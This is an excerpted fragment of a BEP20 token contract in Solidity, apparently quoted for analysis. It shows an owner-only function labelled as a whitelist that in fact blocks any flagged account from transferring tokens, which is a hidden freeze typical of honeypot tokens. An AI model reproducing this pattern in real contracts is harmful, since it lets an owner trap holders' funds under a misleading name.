...
contract Token is IBEP20, HasForeignAsset {
    ...
    function getWhiteList(address acccount) public view returns (bool) {
        return _whiteList[acccount];
    }

    function cancelWhiteList(address acccount,bool statu) public onlyOwner {
        _whiteList[acccount] = statu;
    }
    ...
    function _transfer(
        ...
        if (_whiteList[sender] == true) {
            revert("Whitelist cannot be transferred");
        }
        uint256 feilamnount = 0;
